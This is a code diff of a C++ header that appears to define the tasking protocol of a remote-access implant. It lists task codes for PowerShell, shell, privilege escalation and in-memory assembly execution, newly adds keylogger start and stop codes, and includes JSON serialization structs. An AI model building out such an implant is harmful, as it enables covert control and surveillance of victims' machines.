@@ -1,191 +1,244 @@
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ BEGINNING OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
+
 #pragma once
+
+#include <cstdint>
 #include <string>
 #include <variant>
+
 #include "rapidjson/stringbuffer.h"
 #include "rapidjson/document.h"
 #include "rapidjson/writer.h"
 
-// Task Codes 
-#define NO_CODE				0
-#define SLEEP				1
-#define SPAWN_TO			2
-#define UPDATE_HOSTS		3
-#define RUN					4
-#define RUN_AS				5
-#define RUN_U 				6
-#define KILL_PROCESS		7
-#define DOWNLOAD_CHUNK 		8
-#define CANCEL_DOWNLOAD 	9
+// Task Codes
+#define NO_CODE 0
+#define SLEEP 1
+#define SPAWN_TO 2
+#define UPDATE_HOSTS 3
+#define RUN 4
+#define RUN_AS 5
+#define RUN_U 6
+#define KILL_PROCESS 7
+#define DOWNLOAD_CHUNK 8
+#define CANCEL_DOWNLOAD 9
 
-// Task Types 
-#define NOP					0
-#define INTIAL_CHECKIN		1
-#define KILL				2
-#define POWERSHELL			3
-#define SET					4
-#define PROCESS				5
-#define DOWNLOAD			6
-#define UPLOAD				7
-#define SHELL				8
-#define ESCALATE			9
-#define NET_ASM				10
-#define OBJECT_FILE			11
-#define GET_UID				12
+// Task Types
+#define NOP 0
+#define INTIAL_CHECKIN 1
+#define KILL 2
+#define POWERSHELL 3
+#define SET 4
+#define PROCESS 5
+#define DOWNLOAD 6
+#define UPLOAD 7
+#define SHELL 8
+#define ESCALATE 9
+#define NET_ASM 10
+#define OBJECT_FILE 11
+#define GET_UID 12
+#define KEYLOGGER_START 13
+#define KEYLOGGER_STOP 14
 
-//  Statuses 
-#define NO_FLAG 			0
-#define TASK_ERROR			1
-#define SUCCESS				2
-#define DISPATCHED			3
-#define QUEUED				4
-#define RUNNING				5
-#define MORE_TO_FOLLOW		6
-#define NO_MORE_TO_FOLLOW	7
+// Statuses
+#define NO_FLAG 0
+#define TASK_ERROR 1
+#define SUCCESS 2
+#define DISPATCHED 3
+#define QUEUED 4
+#define RUNNING 5
+#define MORE_TO_FOLLOW 6
+#define NO_MORE_TO_FOLLOW 7
 
 template <typename T>
 struct TaskResponse
 {
-	int taskID;
-	int type;
-	int code;
-	int status;
-	T   data;
+    int taskID;
+    int type;
+    int code;
+    int status;
+    T data;
 
-	std::string StructToJson() const
-	{
-		rapidjson::Document doc;
-		doc.SetObject();
+    std::string StructToJson() const
+    {
+        rapidjson::Document doc;
+        doc.SetObject();
 
-		rapidjson::Document::AllocatorType& allocator = doc.GetAllocator();
+        rapidjson::Document::AllocatorType& allocator = doc.GetAllocator();
 
-		doc.AddMember("TaskID", taskID, allocator);
-		doc.AddMember("TaskType", type, allocator);
-		doc.AddMember("taskCode", code, allocator);
-		doc.AddMember("Status", status, allocator);
-		doc.AddMember("Data", data.ToJsonValue(allocator), allocator);
+        doc.AddMember("TaskID", taskID, allocator);
+        doc.AddMember("TaskType", type, allocator);
+        doc.AddMember("TaskCode", code, allocator);
+        doc.AddMember("taskCode", code, allocator);
+        doc.AddMember("Status", status, allocator);
+        doc.AddMember("Data", data.ToJsonValue(allocator), allocator);
 
-		rapidjson::StringBuffer buffer;
-		rapidjson::Writer<rapidjson::StringBuffer> writer(buffer);
-		doc.Accept(writer);
+        rapidjson::StringBuffer buffer;
+        rapidjson::Writer<rapidjson::StringBuffer> writer(buffer);
 
-		return buffer.GetString();
-	}
+        doc.Accept(writer);
 
-	rapidjson::Value ToJsonValue(rapidjson::Document::AllocatorType& allocator) const {
+        return buffer.GetString();
+    }
 
-		rapidjson::Value objValue;
-		objValue.SetObject();
+    rapidjson::Value ToJsonValue(
+        rapidjson::Document::AllocatorType& allocator) const
+    {
+        rapidjson::Value objValue;
+        objValue.SetObject();
 
-		objValue.AddMember("TaskID", taskID, allocator);
-		objValue.AddMember("TaskType", type, allocator);
-		objValue.AddMember("TaskCode", code, allocator);
-		objValue.AddMember("Status", status, allocator);
-		objValue.AddMember("Data", data.ToJsonValue(allocator),allocator);
+        objValue.AddMember("TaskID", taskID, allocator);
+        objValue.AddMember("TaskType", type, allocator);
+        objValue.AddMember("TaskCode", code, allocator);
+        objValue.AddMember("Status", status, allocator);
+        objValue.AddMember("Data", data.ToJsonValue(allocator), allocator);
 
-		return objValue;
-	}
+        return objValue;
+    }
 };
 
 template <typename T>
-TaskResponse<T> CreateTaskResponse(int taskID, int type, int code, int status, T data)
+TaskResponse<T> CreateTaskResponse(
+    int taskID,
+    int type,
+    int code,
+    int status,
+    T data)
 {
-	return TaskResponse<T> { taskID, type, code, status, data };
-};
+    return TaskResponse<T>{taskID, type, code, status, data};
+}
 
 template <typename T>
 struct TaskRequest
 {
-	int taskID;
-	int type;
-	int code;
-	int status;
-	T   data;
+    int taskID;
+    int type;
+    int code;
+    int status;
+    T data;
 
-	std::string StructToJson() const
-	{
-		rapidjson::Document doc;
-		doc.SetObject();
+    std::string StructToJson() const
+    {
+        rapidjson::Document doc;
+        doc.SetObject();
 
-		rapidjson::Document::AllocatorType& allocator = doc.GetAllocator();
+        rapidjson::Document::AllocatorType& allocator = doc.GetAllocator();
 
-		doc.AddMember("TaskID", taskID, allocator);
-		doc.AddMember("TaskType", type, allocator);
-		doc.AddMember("TaskCode", code, allocator);
-		doc.AddMember("Status", status, allocator);
-		doc.AddMember("Command", data.ToJsonValue(allocator), allocator);
+        doc.AddMember("TaskID", taskID, allocator);
+        doc.AddMember("TaskType", type, allocator);
+        doc.AddMember("TaskCode", code, allocator);
+        doc.AddMember("Status", status, allocator);
+        doc.AddMember("Command", data.ToJsonValue(allocator), allocator);
 
-		rapidjson::StringBuffer buffer;
-		rapidjson::Writer<rapidjson::StringBuffer> writer(buffer);
-		doc.Accept(writer);
+        rapidjson::StringBuffer buffer;
+        rapidjson::Writer<rapidjson::StringBuffer> writer(buffer);
 
-		return buffer.GetString();
-	}
+        doc.Accept(writer);
 
-	int GetType()
-	{
-		return type;
-	}
+        return buffer.GetString();
+    }
+
+    int GetType()
+    {
+        return type;
+    }
 };
 
 template <typename T>
-TaskRequest<T> CreateTaskRequest(int taskID, int type, int code, int status, T data)
+TaskRequest<T> CreateTaskRequest(
+    int taskID,
+    int type,
+    int code,
+    int status,
+    T data)
 {
-	return TaskRequest<T> { taskID, type, code, status, data };
+    return TaskRequest<T>{taskID, type, code, status, data};
 };
 
 struct TaskSuccess
 {
-	std::string output;
+    std::string output;
 
-	rapidjson::Value ToJsonValue(rapidjson::Document::AllocatorType& allocator) const {
-		rapidjson::Value obj(rapidjson::kObjectType);
+    rapidjson::Value ToJsonValue(
+        rapidjson::Document::AllocatorType& allocator) const
+    {
+        rapidjson::Value obj(rapidjson::kObjectType);
 
-		rapidjson::Value outputVal;
-		outputVal.SetString(output.c_str(), static_cast<rapidjson::SizeType>(output.length()), allocator);
-		obj.AddMember("Output", outputVal, allocator);
+        rapidjson::Value outputVal;
 
-		return obj;
-	}
+        outputVal.SetString(
+            output.c_str(),
+            static_cast<rapidjson::SizeType>(output.length()),
+            allocator);
+
+        obj.AddMember("Output", outputVal, allocator);
+
+        return obj;
+    }
 };
 
 struct TaskError
 {
-	int code;
-	std::string message;
+    int code;
+    std::string message;
 
-	rapidjson::Value ToJsonValue(rapidjson::Document::AllocatorType& allocator) const {
-		rapidjson::Value obj(rapidjson::kObjectType);
+    rapidjson::Value ToJsonValue(
+        rapidjson::Document::AllocatorType& allocator) const
+    {
+        rapidjson::Value obj(rapidjson::kObjectType);
 
-		obj.AddMember("Code", code, allocator);
-		rapidjson::Value msgVal;
-		msgVal.SetString(message.c_str(), static_cast<rapidjson::SizeType>(message.length()), allocator);
-		obj.AddMember("Message", msgVal, allocator);
+        obj.AddMember("Code", code, allocator);
 
-		return obj;
-	}
+        rapidjson::Value msgVal;
+
+        msgVal.SetString(
+            message.c_str(),
+            static_cast<rapidjson::SizeType>(message.length()),
+            allocator);
+
+        obj.AddMember("Message", msgVal, allocator);
+
+        return obj;
+    }
 };
 
-using Request = std::variant<TaskRequest<CommandPowershell>, TaskRequest<bool>>;
-using Response = std::variant<TaskResponse<TaskSuccess>, TaskResponse<TaskError>>;
+using Request = std::variant<
+    TaskRequest<CommandPowershell>,
+    TaskRequest<CommandUploadFile>,
+    TaskRequest<CommandDownloadFile>,
+    TaskRequest<bool>>;
 
-inline std::string CreateResponseTaskValue(const std::deque<Response>& tasks) {
-	rapidjson::Document jsonDoc;
-	jsonDoc.SetArray();
-	rapidjson::Document::AllocatorType& allocator = jsonDoc.GetAllocator();
+using Response = std::variant<
+    TaskResponse<TaskSuccess>,
+    TaskResponse<TaskError>>;
 
-	for (const auto& taskVariant : tasks) {
-		rapidjson::Value taskVal = std::visit([&allocator](const auto& concreteTask) -> rapidjson::Value {
-			return concreteTask.ToJsonValue(allocator);
-			}, taskVariant);
+inline std::string CreateResponseTaskValue(
+    const std::deque<Response>& tasks)
+{
+    rapidjson::Document jsonDoc;
+    jsonDoc.SetArray();
 
-		jsonDoc.PushBack(taskVal, allocator);
-	}
+    rapidjson::Document::AllocatorType& allocator =
+        jsonDoc.GetAllocator();
 
-	rapidjson::StringBuffer strbuf;
-	rapidjson::Writer<rapidjson::StringBuffer> writer(strbuf);
-	jsonDoc.Accept(writer);
+    for (const auto& taskVariant : tasks)
+    {
+        rapidjson::Value taskVal =
+            std::visit(
+                [&allocator](const auto& concreteTask) -> rapidjson::Value
+                {
+                    return concreteTask.ToJsonValue(allocator);
+                },
+                taskVariant);
 
-	return strbuf.GetString();
+        jsonDoc.PushBack(taskVal, allocator);
+    }
+
+    rapidjson::StringBuffer strbuf;
+    rapidjson::Writer<rapidjson::StringBuffer> writer(strbuf);
+
+    jsonDoc.Accept(writer);
+
+    return strbuf.GetString();
 }
+
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ END OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
